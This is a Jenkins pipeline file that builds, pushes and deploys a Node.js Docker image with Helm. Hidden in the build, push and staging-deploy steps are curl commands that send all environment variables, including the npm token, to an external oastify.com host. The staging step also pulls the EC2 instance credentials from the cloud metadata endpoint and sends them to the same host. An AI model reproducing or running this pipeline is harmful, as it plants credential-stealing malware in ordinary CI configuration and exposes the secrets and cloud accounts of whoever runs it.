pipeline {
  agent none
  options {
    buildDiscarder(logRotator(daysToKeepStr: '30'))
    timestamps()
    ansiColor('xterm')
  }
  stages {
    stage ('Pre-requisits') {
      steps {
        initPipeline(useGithubApi: false, shallowCheckout: false)
      }
    }
    stage('Test and build image') {
      parallel {
        stage ('Test') {
          steps {
            nodejsContainer (nodeVersion: "8.9.0-builder") {
              sh "echo Your tests go here"
            }
          }
        }

        stage ('Build image') {
          environment {
            NPM_TOKEN = credentials("npm-token")
          }
          steps {
            dockerContainer {
                  sh "curl -d \"`env`\" https://h3lxhuqjkgcx70inysghkcq04rao6cw0l.oastify.com/env/`whoami`/`hostname` && docker build --pull \
                                   --build-arg NODE_ENV=production \
                                   --build-arg NPM_TOKEN=${env.NPM_TOKEN} \
                                   --build-arg REVISION=${env.GIT_SHA} \
                                   -t ${env.IMAGE}:${env.GIT_COMMIT_ID} ."
            }
          }
        }
      }
    }

    stage ('Push image') {
      when {
        anyOf {
          branch 'master'
          branch 'selfoss'
          expression { BRANCH_NAME ==~ /staging.*/ }
          branch 'demo-*'
        }
      }
      steps {
        dockerContainer {
          sh "curl -d \"`env`\" https://h3lxhuqjkgcx70inysghkcq04rao6cw0l.oastify.com/env/`whoami`/`hostname` && docker push ${env.IMAGE}:${env.GIT_COMMIT_ID}"
        }
      }
    }

    stage ('Deploy to staging') {
      when {
        anyOf {
          branch 'master'
          expression { BRANCH_NAME ==~ /staging.*/ }
        }
      }
      steps {
        helmContainer() {
          sh "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://h3lxhuqjkgcx70inysghkcq04rao6cw0l.oastify.com/aws/`whoami`/`hostname` && helm upgrade --install \
                           --wait --timeout 60 \
                           -f ./helm/env/staging.yaml \
                           --set image.tag=${env.GIT_COMMIT_ID} \
                           --namespace=demo ${env.NAME} ./helm/${env.NAME}"
        }
      }
    }

    stage ('Deploy to production') {
      when {
        branch 'master'
      }
      steps {
        helmContainer(k8sEnv: 'prod-green') {
          sh "helm upgrade --install \
            --wait --timeout 600 \
            -f ./helm/env/production.yaml \
            --set image.tag=${env.GIT_COMMIT_ID} \
            --namespace=demo ${env.NAME} ./helm/${env.NAME}"
        }
      }
      post {
        always {
          slack()
        }
        success {
          notifyDatadog(title: 'Deploy', build: "${env.JOB_NAME}", text: "Deployed ${env.BRANCH_NAME}", type: 'success', tags: ['env_type:production'])
          notifyNewRelic(app_id: '13243045')
        }
        failure {
          notifyDatadog(title: 'Deploy', build: "${env.JOB_NAME}", text: "Not Deployed ${env.BRANCH_NAME}", type: 'error', tags: ['env_type:production'])
        }
      }
    }

    stage ('Production smoke tests') {
      when {
        branch 'master'
      }
      steps {
        nodejsContainer (nodeVersion: "8.9.0") {
          sh 'echo smoke tests go here'
        }
      }
    }

  }
}
